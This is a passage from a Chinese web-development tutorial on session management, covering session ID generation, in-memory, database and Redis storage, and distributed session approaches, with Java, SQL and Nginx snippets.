</span><span id="__span-38-32"><a id="__codelineno-38-32" name="__codelineno-38-32" href="#__codelineno-38-32"></a><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">userKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;user:cart:&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="na">getId</span><span class="p">();</span>
</span><span id="__span-38-33"><a id="__codelineno-38-33" name="__codelineno-38-33" href="#__codelineno-38-33"></a>
</span><span id="__span-38-34"><a id="__codelineno-38-34" name="__codelineno-38-34" href="#__codelineno-38-34"></a><span class="w">            </span><span class="c1">// 合并购物车数据</span>
</span><span id="__span-38-35"><a id="__codelineno-38-35" name="__codelineno-38-35" href="#__codelineno-38-35"></a><span class="w">            </span><span class="n">Set</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">anonymousCart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">redis</span><span class="p">.</span><span class="na">smembers</span><span class="p">(</span><span class="n">anonymousKey</span><span class="p">);</span>
</span><span id="__span-38-36"><a id="__codelineno-38-36" name="__codelineno-38-36" href="#__codelineno-38-36"></a><span class="w">            </span><span class="n">redis</span><span class="p">.</span><span class="na">sadd</span><span class="p">(</span><span class="n">userKey</span><span class="p">,</span><span class="w"> </span><span class="n">anonymousCart</span><span class="p">.</span><span class="na">toArray</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">));</span>
</span><span id="__span-38-37"><a id="__codelineno-38-37" name="__codelineno-38-37" href="#__codelineno-38-37"></a>
</span><span id="__span-38-38"><a id="__codelineno-38-38" name="__codelineno-38-38" href="#__codelineno-38-38"></a><span class="w">            </span><span class="c1">// 删除匿名数据</span>
</span><span id="__span-38-39"><a id="__codelineno-38-39" name="__codelineno-38-39" href="#__codelineno-38-39"></a><span class="w">            </span><span class="n">redis</span><span class="p">.</span><span class="na">del</span><span class="p">(</span><span class="n">anonymousKey</span><span class="p">);</span>
</span><span id="__span-38-40"><a id="__codelineno-38-40" name="__codelineno-38-40" href="#__codelineno-38-40"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-38-41"><a id="__codelineno-38-41" name="__codelineno-38-41" href="#__codelineno-38-41"></a>
</span><span id="__span-38-42"><a id="__codelineno-38-42" name="__codelineno-38-42" href="#__codelineno-38-42"></a><span class="w">        </span><span class="c1">// 4. 返回Token</span>
</span><span id="__span-38-43"><a id="__codelineno-38-43" name="__codelineno-38-43" href="#__codelineno-38-43"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TokenResponse</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span><span id="__span-38-44"><a id="__codelineno-38-44" name="__codelineno-38-44" href="#__codelineno-38-44"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-38-45"><a id="__codelineno-38-45" name="__codelineno-38-45" href="#__codelineno-38-45"></a>
</span><span id="__span-38-46"><a id="__codelineno-38-46" name="__codelineno-38-46" href="#__codelineno-38-46"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-38-47"><a id="__codelineno-38-47" name="__codelineno-38-47" href="#__codelineno-38-47"></a><span class="cm">     * 登录后：使用JWT中的用户ID</span>
</span><span id="__span-38-48"><a id="__codelineno-38-48" name="__codelineno-38-48" href="#__codelineno-38-48"></a><span class="cm">     */</span>
</span><span id="__span-38-49"><a id="__codelineno-38-49" name="__codelineno-38-49" href="#__codelineno-38-49"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">addToUserCart</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">jwtToken</span><span class="p">,</span><span class="w"> </span><span class="n">Product</span><span class="w"> </span><span class="n">product</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-38-50"><a id="__codelineno-38-50" name="__codelineno-38-50" href="#__codelineno-38-50"></a><span class="w">        </span><span class="c1">// 从Token中提取用户ID</span>
</span><span id="__span-38-51"><a id="__codelineno-38-51" name="__codelineno-38-51" href="#__codelineno-38-51"></a><span class="w">        </span><span class="n">Claims</span><span class="w"> </span><span class="n">claims</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwtService</span><span class="p">.</span><span class="na">validateToken</span><span class="p">(</span><span class="n">jwtToken</span><span class="p">);</span>
</span><span id="__span-38-52"><a id="__codelineno-38-52" name="__codelineno-38-52" href="#__codelineno-38-52"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">userId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">claims</span><span class="p">.</span><span class="na">getSubject</span><span class="p">();</span>
</span><span id="__span-38-53"><a id="__codelineno-38-53" name="__codelineno-38-53" href="#__codelineno-38-53"></a>
</span><span id="__span-38-54"><a id="__codelineno-38-54" name="__codelineno-38-54" href="#__codelineno-38-54"></a><span class="w">        </span><span class="c1">// 存储到用户购物车</span>
</span><span id="__span-38-55"><a id="__codelineno-38-55" name="__codelineno-38-55" href="#__codelineno-38-55"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;user:cart:&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">userId</span><span class="p">;</span>
</span><span id="__span-38-56"><a id="__codelineno-38-56" name="__codelineno-38-56" href="#__codelineno-38-56"></a><span class="w">        </span><span class="n">redis</span><span class="p">.</span><span class="na">sadd</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">product</span><span class="p">.</span><span class="na">getId</span><span class="p">());</span>
</span><span id="__span-38-57"><a id="__codelineno-38-57" name="__codelineno-38-57" href="#__codelineno-38-57"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-38-58"><a id="__codelineno-38-58" name="__codelineno-38-58" href="#__codelineno-38-58"></a><span class="p">}</span>
</span></code></pre></div>
<h3 id="14-sessionid生成算法">1.4 SessionID生成算法<a class="headerlink" href="#14-sessionid生成算法" title="链接到此标题">&para;</a></h3>
<p><strong>安全要求：</strong>
- <strong>随机性</strong>：不可预测
- <strong>唯一性</strong>：不会冲突
- <strong>长度适中</strong>：32-128字符</p>
<p><strong>常用生成方法：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>方法1：UUID（推荐）
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>sessionId = UUID.randomUUID().toString()
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>示例：3f2504e0-4f89-41d3-9a0c-0305e82c3301
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>
</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>方法2：安全随机数 + Base64
</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>byte[] randomBytes = new byte[32];
</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>SecureRandom.getInstanceStrong().nextBytes(randomBytes);
</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a>sessionId = Base64.getUrlEncoder().encodeToString(randomBytes)
</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>示例：5J2vM8kPqL9Xw3nF7hR4tY6uI1oP
</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a>
</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a>方法3：哈希组合（增强）
</span><span id="__span-39-12"><a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a>data = userId + timestamp + serverSecret + randomNumber
</span><span id="__span-39-13"><a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a>sessionId = SHA256(data)
</span><span id="__span-39-14"><a id="__codelineno-39-14" name="__codelineno-39-14" href="#__codelineno-39-14"></a>示例：a7f3b9c2e1d4f8b5a6c3e2d1f9b8c7a6
</span><span id="__span-39-15"><a id="__codelineno-39-15" name="__codelineno-39-15" href="#__codelineno-39-15"></a>
</span><span id="__span-39-16"><a id="__codelineno-39-16" name="__codelineno-39-16" href="#__codelineno-39-16"></a>⚠️ 错误示例（不安全）：
</span><span id="__span-39-17"><a id="__codelineno-39-17" name="__codelineno-39-17" href="#__codelineno-39-17"></a>sessionId = userId + timestamp  // 可预测！
</span><span id="__span-39-18"><a id="__codelineno-39-18" name="__codelineno-39-18" href="#__codelineno-39-18"></a>sessionId = MD5(userId)         // 可推测！
</span></code></pre></div></p>
<h3 id="14-session存储方案">1.4 Session存储方案<a class="headerlink" href="#14-session存储方案" title="链接到此标题">&para;</a></h3>
<h4 id="方案1内存存储in-memory">方案1：内存存储（In-Memory）<a class="headerlink" href="#方案1内存存储in-memory" title="链接到此标题">&para;</a></h4>
<p>**适用场景：**单机应用、开发测试环境</p>
<p><strong>实现方式：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1">// 使用ConcurrentHashMap存储</span>
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">SessionData</span><span class="o">&gt;</span><span class="w"> </span><span class="n">sessions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">ConcurrentHashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span>
</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>
</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="c1">// 创建Session</span>
</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">createSession</span><span class="p">(</span><span class="n">SessionData</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">sessionId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UUID</span><span class="p">.</span><span class="na">randomUUID</span><span class="p">().</span><span class="na">toString</span><span class="p">();</span>
</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a><span class="w">    </span><span class="n">sessions</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">sessionId</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">);</span>
</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">sessionId</span><span class="p">;</span>
</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a><span class="p">}</span>
</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a>
</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a><span class="c1">// 获取Session</span>
</span><span id="__span-40-13"><a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a><span class="kd">public</span><span class="w"> </span><span class="n">SessionData</span><span class="w"> </span><span class="nf">getSession</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">sessionId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-40-14"><a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">sessions</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">sessionId</span><span class="p">);</span>
</span><span id="__span-40-15"><a id="__codelineno-40-15" name="__codelineno-40-15" href="#__codelineno-40-15"></a><span class="p">}</span>
</span><span id="__span-40-16"><a id="__codelineno-40-16" name="__codelineno-40-16" href="#__codelineno-40-16"></a>
</span><span id="__span-40-17"><a id="__codelineno-40-17" name="__codelineno-40-17" href="#__codelineno-40-17"></a><span class="c1">// 删除Session</span>
</span><span id="__span-40-18"><a id="__codelineno-40-18" name="__codelineno-40-18" href="#__codelineno-40-18"></a><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">removeSession</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">sessionId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-40-19"><a id="__codelineno-40-19" name="__codelineno-40-19" href="#__codelineno-40-19"></a><span class="w">    </span><span class="n">sessions</span><span class="p">.</span><span class="na">remove</span><span class="p">(</span><span class="n">sessionId</span><span class="p">);</span>
</span><span id="__span-40-20"><a id="__codelineno-40-20" name="__codelineno-40-20" href="#__codelineno-40-20"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>优点：</strong>
- ✅ 性能最高，直接内存访问
- ✅ 实现简单
- ✅ 无需额外组件</p>
<p><strong>缺点：</strong>
- ❌ 服务器重启Session丢失
- ❌ 不支持分布式
- ❌ 内存占用大（用户多时）
- ❌ 无法持久化</p>
<h4 id="方案2数据库存储database">方案2：数据库存储（Database）<a class="headerlink" href="#方案2数据库存储database" title="链接到此标题">&para;</a></h4>
<p>**适用场景：**需要持久化、审计要求高</p>
<p><strong>表结构设计：</strong>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">sessions</span><span class="w"> </span><span class="p">(</span>
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="w">    </span><span class="n">session_id</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="p">,</span>
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="w">    </span><span class="n">user_id</span><span class="w"> </span><span class="nb">BIGINT</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span>
</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="w">    </span><span class="n">session_data</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">,</span><span class="w">           </span><span class="c1">-- JSON格式存储</span>
</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="w">    </span><span class="n">created_at</span><span class="w"> </span><span class="k">TIMESTAMP</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="k">CURRENT_TIMESTAMP</span><span class="p">,</span>
</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="w">    </span><span class="n">last_accessed_at</span><span class="w"> </span><span class="k">TIMESTAMP</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="k">CURRENT_TIMESTAMP</span><span class="p">,</span>
</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="w">    </span><span class="n">expires_at</span><span class="w"> </span><span class="k">TIMESTAMP</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span>
</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="w">    </span><span class="n">ip_address</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">45</span><span class="p">),</span>
</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="w">    </span><span class="n">user_agent</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span>
</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="w">    </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_user_id</span><span class="w"> </span><span class="p">(</span><span class="n">user_id</span><span class="p">),</span>
</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a><span class="w">    </span><span class="k">INDEX</span><span class="w"> </span><span class="n">idx_expires_at</span><span class="w"> </span><span class="p">(</span><span class="n">expires_at</span><span class="p">)</span>
</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a><span class="p">);</span>
</span><span id="__span-41-13"><a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a>
</span><span id="__span-41-14"><a id="__codelineno-41-14" name="__codelineno-41-14" href="#__codelineno-41-14"></a><span class="c1">-- 清理过期Session的定时任务</span>
</span><span id="__span-41-15"><a id="__codelineno-41-15" name="__codelineno-41-15" href="#__codelineno-41-15"></a><span class="k">DELETE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sessions</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">expires_at</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">NOW</span><span class="p">();</span>
</span></code></pre></div></p>
<p><strong>优点：</strong>
- ✅ 数据持久化，服务器重启不丢失
- ✅ 支持审计和统计
- ✅ 可以查询用户的所有Session</p>
<p><strong>缺点：</strong>
- ❌ 性能较差（磁盘I/O）
- ❌ 增加数据库负载
- ❌ 需要定期清理过期数据</p>
<h4 id="方案3redis存储推荐用于分布式">方案3：Redis存储（推荐用于分布式）<a class="headerlink" href="#方案3redis存储推荐用于分布式" title="链接到此标题">&para;</a></h4>
<p>**适用场景：**分布式系统、高并发场景</p>
<p><strong>实现方式：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>// 存储Session
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>SET session:abc123 &quot;{\&quot;userId\&quot;:1001,\&quot;username\&quot;:\&quot;zhang\&quot;}&quot; EX 1800
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>
</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>// 数据结构
</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>Key: session:{sessionId}
</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>Value: JSON格式的Session数据
</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>TTL: 1800秒（30分钟）
</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>
</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a>// 读取Session
</span><span id="__span-42-10"><a id="__codelineno-42-10" name="__codelineno-42-10" href="#__codelineno-42-10"></a>GET session:abc123
</span><span id="__span-42-11"><a id="__codelineno-42-11" name="__codelineno-42-11" href="#__codelineno-42-11"></a>
</span><span id="__span-42-12"><a id="__codelineno-42-12" name="__codelineno-42-12" href="#__codelineno-42-12"></a>// 更新过期时间（滑动过期）
</span><span id="__span-42-13"><a id="__codelineno-42-13" name="__codelineno-42-13" href="#__codelineno-42-13"></a>EXPIRE session:abc123 1800
</span><span id="__span-42-14"><a id="__codelineno-42-14" name="__codelineno-42-14" href="#__codelineno-42-14"></a>
</span><span id="__span-42-15"><a id="__codelineno-42-15" name="__codelineno-42-15" href="#__codelineno-42-15"></a>// 删除Session（登出）
</span><span id="__span-42-16"><a id="__codelineno-42-16" name="__codelineno-42-16" href="#__codelineno-42-16"></a>DEL session:abc123
</span><span id="__span-42-17"><a id="__codelineno-42-17" name="__codelineno-42-17" href="#__codelineno-42-17"></a>
</span><span id="__span-42-18"><a id="__codelineno-42-18" name="__codelineno-42-18" href="#__codelineno-42-18"></a>// 获取用户的所有Session（多设备登录管理）
</span><span id="__span-42-19"><a id="__codelineno-42-19" name="__codelineno-42-19" href="#__codelineno-42-19"></a>Key模式: session:user:{userId}:{deviceId}
</span><span id="__span-42-20"><a id="__codelineno-42-20" name="__codelineno-42-20" href="#__codelineno-42-20"></a>KEYS session:user:1001:*
</span></code></pre></div></p>
<p><strong>优点：</strong>
- ✅ 高性能（内存数据库）
- ✅ 支持分布式
- ✅ 自动过期（TTL）
- ✅ 支持集群和主从复制
- ✅ 丰富的数据结构</p>
<p><strong>缺点：</strong>
- ❌ 需要额外的Redis服务器
- ❌ 增加架构复杂度
- ❌ Redis宕机影响所有Session</p>
<h3 id="15-分布式session解决方案">1.5 分布式Session解决方案<a class="headerlink" href="#15-分布式session解决方案" title="链接到此标题">&para;</a></h3>
<h4 id="问题场景">问题场景：<a class="headerlink" href="#问题场景" title="链接到此标题">&para;</a></h4>
<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>用户请求可能路由到不同服务器：
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>请求1 → 服务器A → 创建Session
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>请求2 → 服务器B → 找不到Session（因为在A上）
</span></code></pre></div>
<h4 id="解决方案对比">解决方案对比：<a class="headerlink" href="#解决方案对比" title="链接到此标题">&para;</a></h4>
<p><strong>方案1：Session粘滞（Sticky Session）</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>原理：通过负载均衡器确保同一用户的请求总是路由到同一台服务器
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>配置示例（Nginx）：
</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>upstream backend {
</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>    ip_hash;  # 基于IP哈希
</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>    server server1:8080;
</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>    server server2:8080;
</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>    server server3:8080;
</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a>}
</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a>
</span><span id="__span-44-11"><a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a>流程：
</span><span id="__span-44-12"><a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a>客户端IP: 192.168.1.100 → 哈希计算 → 总是路由到server2
</span></code></pre></div>
<p><strong>优点：</strong>
- ✅ 实现简单，无需修改应用代码
- ✅ 无Session同步开销</p>
<p><strong>缺点：</strong>
- ❌ 服务器宕机导致Session丢失
- ❌ 负载不均衡（某些服务器压力大）
- ❌ 扩容缩容困难</p>
<p><strong>方案2：Session复制（Session Replication）</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>原理：每台服务器同步Session数据到其他服务器
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>Server A创建Session → 广播到Server B, C, D
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>Server B修改Session → 广播到Server A, C, D
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>
</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>实现：Tomcat Cluster、Spring Session
</span></code></pre></div>
<p><strong>优点：</strong>
- ✅ 高可用，任意服务器宕机不影响
- ✅ 用户请求可路由到任意服务器</p>
<p><strong>缺点：</strong>
- ❌ 网络开销大（N²复杂度）
- ❌ Session数据不一致风险
- ❌ 扩展性差（服务器多时性能下降）</p>
<p><strong>方案3：集中式Session存储（推荐）</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>原理：将Session统一存储在外部存储（Redis/Memcached）
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>所有服务器 → 共享Redis → 统一Session存储
</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>
</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>架构：
</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>┌──────────┐    ┌──────────┐    ┌──────────┐
</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a>│ Server A │    │ Server B │    │ Server C │
</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a>└────┬─────┘    └────┬─────┘    └────┬─────┘
</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a>     │               │               │
</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a>     └───────────────┼───────────────┘
</span><span id="__span-46-11"><a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a>                     │
</span><span id="__span-46-12"><a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a>              ┌──────┴──────┐
</span><span id="__span-46-13"><a id="__codelineno-46-13" name="__codelineno-46-13" href="#__codelineno-46-13"></a>              │    Redis    │
</span><span id="__span-46-14"><a id="__codelineno-46-14" name="__codelineno-46-14" href="#__codelineno-46-14"></a>              │   (Session  │
</span><span id="__span-46-15"><a id="__codelineno-46-15" name="__codelineno-46-15" href="#__codelineno-46-15"></a>              │   Storage)  │
</span><span id="__span-46-16"><a id="__codelineno-46-16" name="__codelineno-46-16" href="#__codelineno-46-16"></a>              └─────────────┘
</span></code></pre></div>
<p><strong>优点：</strong>
- ✅ 完美支持分布式
- ✅ 易于扩展
- ✅ 数据一致性好
- ✅ 支持持久化</p>
<p><strong>缺点：</strong>
- ❌ Redis成为单点（需要高可用方案）
- ❌ 网络延迟（相比本地内存）</p>
<p><strong>方案选择建议：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>1. 小型单体应用（&lt;3台服务器）
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>   → Session粘滞
</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>
</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>2. 中型分布式应用
</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>   → Redis集中存储
</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>
</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>3. 大型微服务架构
